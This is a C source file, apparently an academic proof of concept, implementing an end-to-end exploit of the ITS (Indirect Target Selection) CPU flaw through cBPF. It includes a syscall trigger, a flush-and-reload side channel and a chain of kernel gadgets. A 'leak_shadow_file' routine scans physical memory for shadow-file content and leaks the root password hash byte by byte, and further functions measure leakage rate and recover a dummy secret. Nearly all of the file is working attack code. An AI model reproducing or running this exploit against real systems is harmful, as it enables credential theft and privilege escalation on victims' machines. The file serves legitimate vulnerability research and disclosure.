/*
 * End-to-end ITS (Indirect Target Selection) exploit via cBPF
 * Friday, March 22th 2024
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <syscall.h>
#include <sys/time.h>

#include "flush_and_reload.h"
#include "targets.h"
#include "common.h"
#include "branch_eviction.h"


static __always_inline int trigger_victim(struct config *cfg) {

    // rdi, rsi, rdx, r10, r8, and r9
    asm volatile(
        "mov %%rbx, %%r10\n"               // flags
        "mov $0x10, %%r8\n"                // fd
        "mov $0xfffffffffffff000, %%r9\n"  // off OFFSET HAS TO BE page aligned
        "syscall\n"
        :
        : "a" (__NR_mmap),
            "D" (0),			   // rdi (addr)
            "S" (0),		       // rsi (len)  0 == fastest path
            "d" (cfg->gadget_arg), // rdx (prot) // cfg->ind_map_arg // cfg->fr_buf_kern - 0x18
            "b" ((uint64_t) MAP_PRIVATE | MAP_ANONYMOUS) // flags (fastest path)
        : "r8","r9","r10", "r11", "rcx"
    );

    return 0;

}

uint64_t do_flush_and_reload(struct config * cfg, uint64_t iterations, uint8_t ret_on_hit) {

    char buf_test[17];
    uint64_t hits = 0;

    for(int iter=0; iter < iterations; iter++) {

        flush(cfg->reload_addr);

        walk_branch_eviction(cfg->evicting_branch);

#ifdef USE_BRANCH_CONTENTION_LIST
        walk_branch_eviction(cfg->branch_contention_list[0]);
#endif

        asm volatile("sfence\n");

        evict(cfg->ev_set_l2_hook);
        evict(cfg->ev_set_l2_entry);

        // trigger
        trigger_victim(cfg);

        cpuid();

        if(load_time(cfg->reload_addr) < THR) {
            if (ret_on_hit) {
                return 1;
            } else {
                hits++;
            }
        }
    }

    return hits;


}

int leak_byte_forwards(struct config * cfg, uint64_t prefix) {

    uint64_t fr_offset, hits;

    cfg->reload_addr = cfg->fr_buf;

    for (size_t outer = 0; outer < 10; outer++)
    {
        for (uint64_t byte = 0; byte <= 0xff; byte++) {


            fr_offset = (byte << 24);
            fr_offset = (prefix + fr_offset) << 4;

            *cfg->ind_base_addr = (uint64_t) (cfg->fr_buf_kern  - cfg->base_address_offset - fr_offset);

            hits = do_flush_and_reload(cfg, outer >= 2 ? 5 : 1, 1);

            if (hits) {
                return (int) byte;
            }
        }

    }

    return -1;

}

 uint8_t is_signature_at_address(struct config * cfg, uint64_t signature, uint8_t * address, uint64_t iterations) {
    uint64_t offset, hits;

    offset = signature << 4;

    *cfg->ind_base_addr = (uint64_t) (cfg->fr_buf_kern  - cfg->base_address_offset - offset);

    *cfg->ind_secret_addr =  (uint64_t) address - SECRET_ADDRESS_OFFSET;

    hits = do_flush_and_reload(cfg, iterations, 1);

    return hits > 0;

}

// ----------------------------------------------------------------------------
// Load chain setup functions
//
// ----------------------------------------------------------------------------

void set_load_chain_leak_secret(struct config * cfg)
{
    // Dispatch Gadget
    // ------------------------------------------------------------------------
    //  security_mmap_addr+37 // 0xffffffff816df125
    //  mov     rax, qword ptr [rbx+0x18] ; {Attacker@rbx} -> {Attacker}
    //  mov     rdi, r12
    //  call    rax ; {Attacker} -> Dispatch gadget

    // Disclosure gadget
    // ------------------------------------------------------------------------
    //  cmp_entries_key+23: // 0xffffffff812acd97
    //  mov     rbx, qword ptr [rdx] ; {Attacker@rdx} -> {Attacker@0xffffffff812acd97}
    //  mov     rsi, qword ptr [rcx+frame_SRND]
    //  mov     eax, dword ptr [rbx+0xac] ; {Attacker@0xffffffff812acd97} -> {Secret@0xffffffff812acd9e}
    //  shl     rax, 0x4
    //  add     rax, qword ptr [rdx+0x8] ; {Attacker@rdx} -> {Attacker@0xffffffff812acda8}
    //  mov     edi, dword ptr [rax+0x8] ; {Secret@0xffffffff812acd9e, Attacker@0xffffffff812acda8} -> TRANSMISSION


    // zero out
    memset(cfg->ind_map, 0, 0x100);

    cfg->gadget_arg = cfg->ind_map_kern;
    *(uint64_t *)(cfg->ind_map + 0x18) = cfg->leak_gadget_address;

    // -- Secret address chain
    //  mov     rbx, qword ptr [rdx] ; {Attacker@rdx} -> {Attacker@0xffffffff812acd97}
    //  mov     eax, dword ptr [rbx+0xac] ; {Attacker@0xffffffff812acd97} -> {Secret@0xffffffff812acd9e}
    *(uint64_t *)(cfg->ind_map) = (uint64_t) cfg->secret_addr_kern - SECRET_ADDRESS_OFFSET;
    cfg->ind_secret_addr = (uint64_t * ) (cfg->ind_map);

    // -- Base chain
    //  ffffffff812acda8  add     rax, qword ptr [rdx+0x8] ; {Attacker@rdx} -> {Attacker@0xffffffff812acda8}
    //  ffffffff812acdac  mov     edi, dword ptr [rax+0x8] ; {Secret@0xffffffff812acd9e, Attacker@0xffffffff812acda8} -> TRANSMISSION
    *(uint64_t *)(cfg->ind_map + 0x8) = (uint64_t)cfg->fr_buf_kern - cfg->base_address_offset;
    cfg->ind_base_addr = (uint64_t * ) (cfg->ind_map + 0x8);
}


// ----------------------------------------------------------------------------
// Leak test functions
//
// ----------------------------------------------------------------------------

#define NLOADS 4
void print_leakage_rate(struct config * cfg, uint64_t iterations) {

    uint64_t hits[NLOADS] = {0};
    cfg->reload_addr = cfg->fr_buf;

    for (int l = 0; l < (NLOADS * 2); l++)
    {
        hits[l % NLOADS] += do_flush_and_reload(cfg, iterations / 2, 0);

    }

    for (int l = 0; l < NLOADS; l++)
    {
        printf("%6ld ", hits[l]);
        fflush(stdout);
    }


    printf("\n");


}

// ----------------------------------------------------------------------------
// Leak Core functions
//
// ----------------------------------------------------------------------------

#define MAX_SHADOW_LENGTH 0x1000

void leak_shadow_file(struct config * cfg, char shadow_symbol) {
    uint64_t prefix, prefix_offset, search_offset, hits;
    int found;

    uint8_t * secret_kern = cfg->phys_start;
    cfg->reload_addr = cfg->fr_buf;

    set_load_chain_leak_secret(cfg);

    // ------------------------------------------------------------------------
    // Find the location of the shadow file in memory

    char * leaked_bytes = calloc(1, MAX_SHADOW_LENGTH);
    strcpy(leaked_bytes, "root:");

    printf("Finding prefix 0x%08x\n", *(uint32_t *) leaked_bytes);
    printf("\rTesting address: %p [%40s]", secret_kern, "");

    int step = 0;
    int iter = 0;
    fflush(stdout);

    for (; secret_kern <= cfg->phys_end; secret_kern += 0x1000)
    {

        if (secret_kern == cfg->ind_map_kern) {
            // we passed the huge_page, we can skip this
            // secret_kern += HUGE_PAGE_SIZE - 0x1000;
            secret_kern += 0x5000;
            continue;
        }

        if ((uint64_t) secret_kern % (HUGE_PAGE_SIZE * 2) == 0) {
            printf("\rTesting address: %p", secret_kern);
            fflush(stdout);

            if ((secret_kern -  cfg->phys_start) > (((cfg->phys_end - cfg->phys_start) / 40) * step)) {
                step++;
                printf("[%.*s", step, "........................................");
                fflush(stdout);
            }
        }


        // Test for the signature
        hits = is_signature_at_address(cfg, *(uint32_t *) (leaked_bytes + 1), (secret_kern + 1), 10);

        if (!hits) {
            iter++;
            continue;
        }

        // printf("\r%p: %lu hits ", secret_kern, hits);

        prefix = *(uint32_t *) (leaked_bytes + 2);
        *cfg->ind_secret_addr =  (uint64_t) secret_kern - SECRET_ADDRESS_OFFSET + 2;

        found = leak_byte_forwards(cfg, prefix);

        for (size_t i = 0; i < 100 && found == -1; i++) {
            found = leak_byte_forwards(cfg, prefix);
        }
        if (found == -1) {
            // redo address
            secret_kern -= 0x1000;
            continue;
        }

        if(found != shadow_symbol) {
            printf("\r    >> Found 'root:%c' (0x%02x) at address, skipping..: %p %20s\n",
                found >= 0x20 && found <= 0x7E ? found : ' ', found, secret_kern, "");

            printf("\rTesting address: %p [%40s]", secret_kern, "");
            continue;
        }

        printf("\nFound prefix 0x%010lx (%s) at address: %p\n", *(uint64_t *) leaked_bytes, leaked_bytes, secret_kern);
        break;


    }

    if (secret_kern > cfg->phys_end) {
        printf("\nFailed finding shadow file, please restart\n");
        exit(0);
    }

    // ------------------------------------------------------------------------
    // Leak the shadow content

    uint8_t * cur_byte = (uint8_t *) leaked_bytes + 5;
    *cfg->ind_secret_addr =  (uint64_t) secret_kern - SECRET_ADDRESS_OFFSET + 2;

#if (LEAK_ONLY_ROOT_HASH == 0)
    printf("\nShadow content:\n");
#else
    printf("\nPassword hash of root:\n");
#endif


    printf("============================================================\n");
    printf("%s", leaked_bytes);
    fflush(stdout);

    for (int i = 4; i < MAX_SHADOW_LENGTH; i++)
    {
        prefix = *(uint32_t *) (cur_byte - 3);

        found = leak_byte_forwards(cfg, prefix);

        if (found == -1) {
            continue;
        }

        *cur_byte = found;

        if (*cur_byte == '\0') {
            break;
        }

#if (LEAK_ONLY_ROOT_HASH == 1)
        if (*cur_byte == '\n') {
            break;
        }
#endif


        printf("%c", *cur_byte >= 0xa && *cur_byte < 0x7E ? *cur_byte : '.');
        fflush(stdout);

        cur_byte += 1;
        *cfg->ind_secret_addr += 1;
    }

    printf("\n============================================================\n");

}


#define LEAK_RATE_TEST_SIZE (1 << 15) // 32 kB;

void leak_test_leakage_rate(struct config * cfg) {

    // ------------------------------------------------------------------------
    // Initialize a random buffer to leak

    // We initialize the secret from the fifth 4k page onwards
    uint8_t *secret = cfg->ind_map + 0x100000;
    uint8_t *secret_kern = cfg->ind_map_kern + 0x100000;

    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE; i++) {
        secret[i] = (uint8_t) rand();
    }
    memset(secret, 0, 3); // First 3 bytes are zero to start the leak

    uint8_t * leaked_bytes = calloc(1, LEAK_RATE_TEST_SIZE);

    set_load_chain_leak_secret(cfg);

    // ------------------------------------------------------------------------
    // Start the leak

    uint64_t prefix;
    uint8_t * cur_byte;
    int found;

    *cfg->ind_secret_addr = (uint64_t) secret_kern - SECRET_ADDRESS_OFFSET;
    cur_byte = (uint8_t *) leaked_bytes + 3;

    prefix = *(uint32_t *) (cur_byte - 3);

    printf("[%50s]", "");
    int step = 0;
    fflush(stdout);

    struct timeval t0, t1;

    gettimeofday(&t0, NULL);

    for (int i = 0; i < LEAK_RATE_TEST_SIZE; i++)
    {
        prefix = *((uint32_t *) (cur_byte - 3));

        found = leak_byte_forwards(cfg, prefix);

        size_t iter = 0 ;
        while (found == -1 ) {
            if (iter == 1000) {
                printf("\nStuck! Please try again. (IDX: %d Last leaked byte: %x, Last Secret byte: %x)\n", i, *(cur_byte - 1), secret[i + 3 - 1]);
                free(leaked_bytes);
                return;
            }

            found = leak_byte_forwards(cfg, prefix);
            iter++;

        }

        *cur_byte = found;
        cur_byte += 1;
        *cfg->ind_secret_addr += 1;

        if (i % (LEAK_RATE_TEST_SIZE / 50) == 0) {
            step++;
            printf("\r[%.*s", step, "..................................................");
            fflush(stdout);
        }

    }

    gettimeofday(&t1, NULL);

    uint64_t delta_us = (t1.tv_sec - t0.tv_sec) * 1000000 + (t1.tv_usec - t0.tv_usec);

    printf("\n%d kB took %4.1f seconds (%5.1f Byte/sec)\n", LEAK_RATE_TEST_SIZE / 1024, (double) delta_us / 1000000, LEAK_RATE_TEST_SIZE / ( (double) delta_us / 1000000));

    // ------------------------------------------------------------------------
    // Verify for any faults

    uint64_t incorrect = 0;

    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE; i++)
    {
        if (secret[i] != leaked_bytes[i]) {
            incorrect += 1;
        }
    }

    printf("Fault rate: %05.3f%%\n", ((double) incorrect / LEAK_RATE_TEST_SIZE) * 100);

    free(leaked_bytes);

}


#define DUMMY_SECRET_LENGTH 29

void leak_dummy_secret(struct config * cfg) {

    // ------------------------------------------------------------------------
    // We setup a dummy secret and try to leak it

    // Initialize secret
    uint8_t *secret = cfg->ind_map + 0x100000;
    uint8_t *secret_kern = cfg->ind_map_kern + 0x100000;

    memset(secret, 0x0, 3);

    // To test the zero extend prefix

    for (size_t i = 3; i < DUMMY_SECRET_LENGTH; i++) {
        secret[i] = (uint8_t) ('A' + i - 3);
    }

    printf("%15s: 0x%016lx\n", "secret addr user", (uint64_t)secret);
    printf("%15s: 0x%016lx\n", "secret addr kern", (uint64_t)secret_kern);


    set_load_chain_leak_secret(cfg);

    uint8_t leaked_bytes[DUMMY_SECRET_LENGTH] = {0};
    uint64_t prefix;
    int found;

    cfg->reload_addr = cfg->fr_buf;
    *cfg->ind_secret_addr = (uint64_t) secret_kern - SECRET_ADDRESS_OFFSET;
    uint8_t * cur_byte = (uint8_t *) leaked_bytes + 3;


    for (unsigned i = 3; i < DUMMY_SECRET_LENGTH; i++)
    {
        prefix = *((uint32_t *) (cur_byte - 3));

        found = leak_byte_forwards(cfg, prefix);
        while (found == -1 ) {
            found = leak_byte_forwards(cfg, prefix);
        }

        *cur_byte = found;

        printf("0x%03x: Found Byte: 0x%02x (%c) Used prefix: 0x%08lx\n", i, *cur_byte, *cur_byte, prefix);

        cur_byte += 1;
        *cfg->ind_secret_addr += 1;

    }

}

